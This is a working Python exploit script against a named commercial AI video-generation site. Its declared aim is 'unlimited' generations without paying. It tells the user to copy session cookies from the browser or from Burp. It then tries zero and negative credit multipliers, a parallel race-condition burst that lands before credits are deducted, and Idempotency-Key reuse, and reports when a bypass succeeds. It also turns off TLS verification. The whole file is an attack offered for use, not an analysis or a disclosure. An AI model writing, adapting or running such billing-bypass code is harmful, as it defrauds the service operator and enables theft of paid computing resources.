"""
viewmax.io unlimited video gen script
========================================
Attack vectors in order of priority:
  1. multiplier=0  -> zero credit cost per gen
  2. multiplier=-N -> credit refund loop
  3. race burst    -> parallel gens before server deducts
  4. Idempotency-Key reuse -> same key = no double-charge?

HOW TO GET YOUR SESSION COOKIES:
  1. Open viewmax.io in Chrome/Firefox, log in
  2. Open DevTools (F12) -> Application -> Cookies -> www.viewmax.io
  3. Copy value of: __Secure-better-auth.session_token
  4. Copy value of: __Secure-better-auth.session_data
  5. Copy value of: vm_vid
  6. Paste them below and run: python viewmax_unlimited.py

  OR: use Burp Suite, intercept any /api/me request, copy Cookie header
"""

import asyncio
import aiohttp
import json
import time
import sys

# ─────────────────────────────────────────────────────────────────
# FILL THESE IN — grab from DevTools > Application > Cookies
# OR intercept any /api/me request in Burp and copy the Cookie header
# ─────────────────────────────────────────────────────────────────
SESSION_TOKEN = ""   # __Secure-better-auth.session_token
SESSION_DATA  = ""   # __Secure-better-auth.session_data
VM_VID        = ""   # vm_vid  (optional, can leave empty)
# ─────────────────────────────────────────────────────────────────

BASE    = "https://www.viewmax.io"
UA      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0"

def make_headers(extra=None):
    h = {
        "User-Agent": UA,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Origin": BASE,
        "Referer": f"{BASE}/tools/video-generator",
        "Content-Type": "application/json",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Cookie": (
            f"vm_vid={VM_VID}; "
            f"__Secure-better-auth.session_token={SESSION_TOKEN}; "
            f"__Secure-better-auth.session_data={SESSION_DATA}"
        ),
    }
    if extra:
        h.update(extra)
    return h

async def get_credits(session):
    async with session.get(f"{BASE}/api/me", headers=make_headers()) as r:
        if r.status == 200:
            data = await r.json()
            subs = data.get("subscription", {}).get("services", [])
            for s in subs:
                if s.get("type") == "AI_CREDITS":
                    return s.get("used", "?"), s.get("max", "?")
        return "?", "?"

async def test_generate(session, multiplier, prompt="a beautiful sunset timelapse"):
    """Fire a generate request with given multiplier, return (success, response_json)"""
    body = {
        "prompt": prompt,
        "orientation": "portrait",
        "duration": 4,
        "multiplier": multiplier,
        "model": "Sora 2",
    }
    async with session.post(
        f"{BASE}/api/video-generation/generate",
        headers=make_headers(),
        json=body,
    ) as r:
        try:
            data = await r.json()
        except Exception:
            data = {"raw": await r.text()}
        return r.status, data

async def poll_status(session, gen_id, timeout=180):
    """Poll until succeeded/failed or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        async with session.get(
            f"{BASE}/api/video-generation/status?ids={gen_id}",
            headers=make_headers(),
        ) as r:
            if r.status == 200:
                data = await r.json()
                gens = data.get("generations", [])
                if gens:
                    g = gens[0]
                    status = g.get("status")
                    progress = g.get("progress", 0)
                    print(f"  [{gen_id[:8]}] status={status} progress={progress}%", end="\r")
                    if status in ("succeeded", "failed"):
                        print()
                        return g
        await asyncio.sleep(5)
    return None

async def race_burst(session, n=5, prompt="cinematic drone shot of mountains"):
    """Fire n requests simultaneously — race condition before server deducts credits."""
    print(f"\n[RACE] Firing {n} simultaneous requests...")
    tasks = [test_generate(session, multiplier=1, prompt=prompt) for _ in range(n)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for i, r in enumerate(results):
        if isinstance(r, Exception):
            print(f"  [race {i}] ERROR: {r}")
        else:
            status, data = r
            print(f"  [race {i}] http={status} -> {json.dumps(data)[:120]}")
    return results

async def main():
    print("=" * 60)
    print("  viewmax.io unlimited gen tool")
    print("=" * 60)

    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        # ── Check session validity ────────────────────────────────
        print("\n[*] Checking session...")
        used, maxc = await get_credits(session)
        print(f"    AI_CREDITS: {used} / {maxc}")

        if used == "?":
            print("[!] Session invalid or expired. Update SESSION_TOKEN / SESSION_DATA.")
            return

        # ── VECTOR 1: multiplier = 0 ──────────────────────────────
        print("\n[VECTOR 1] Testing multiplier=0 (zero-cost gen)...")
        s, d = await test_generate(session, multiplier=0)
        print(f"  http={s}  resp={json.dumps(d)[:200]}")

        used2, _ = await get_credits(session)
        print(f"  credits after: {used2} / {maxc}")

        if d.get("success") and d.get("generationIds"):
            gid = d["generationIds"][0]
            print(f"  [!] multiplier=0 WORKED! gen_id={gid}")
            if str(used2) == str(used):
                print("  [!!] ZERO CREDITS CONSUMED — full bypass confirmed!")
            else:
                print(f"  credits consumed: {int(used2)-int(used)}")
            print("  Polling for video...")
            result = await poll_status(session, gid)
            if result:
                print(f"  video_url: {result.get('videoUrl','N/A')}")

        # ── VECTOR 2: multiplier = -1 (credit refund) ────────────
        print("\n[VECTOR 2] Testing multiplier=-1 (credit refund)...")
        used_before, _ = await get_credits(session)
        s, d = await test_generate(session, multiplier=-1)
        print(f"  http={s}  resp={json.dumps(d)[:200]}")
        used_after, _ = await get_credits(session)
        delta = int(str(used_after).replace("?","0")) - int(str(used_before).replace("?","0"))
        print(f"  credit delta: {delta}  (negative = credits added back)")

        # ── VECTOR 3: race burst ──────────────────────────────────
        print("\n[VECTOR 3] Race condition burst (5 parallel)...")
        used_before, _ = await get_credits(session)
        await race_burst(session, n=5)
        used_after, _ = await get_credits(session)
        print(f"  credits before: {used_before}  after: {used_after}")

        # ── VECTOR 4: Idempotency-Key reuse ──────────────────────
        print("\n[VECTOR 4] Idempotency-Key reuse (same key, two requests)...")
        ikey = '"999999999999999999"'
        body = {
            "prompt": "a futuristic city at night",
            "orientation": "portrait",
            "duration": 4,
            "multiplier": 1,
            "model": "Sora 2",
        }
        hdrs = make_headers({"Idempotency-Key": ikey})
        for i in range(2):
            async with session.post(f"{BASE}/api/video-generation/generate", headers=hdrs, json=body) as r:
                data = await r.json()
                print(f"  [idem {i+1}] http={r.status}  resp={json.dumps(data)[:150]}")
        used_end, _ = await get_credits(session)
        print(f"  credits after 2 reqs with same key: {used_end}")

        # ── Final status ──────────────────────────────────────────
        print("\n" + "=" * 60)
        final_used, final_max = await get_credits(session)
        print(f"  FINAL credits: {final_used} / {final_max}")
        print("=" * 60)

if __name__ == "__main__":
    asyncio.run(main())
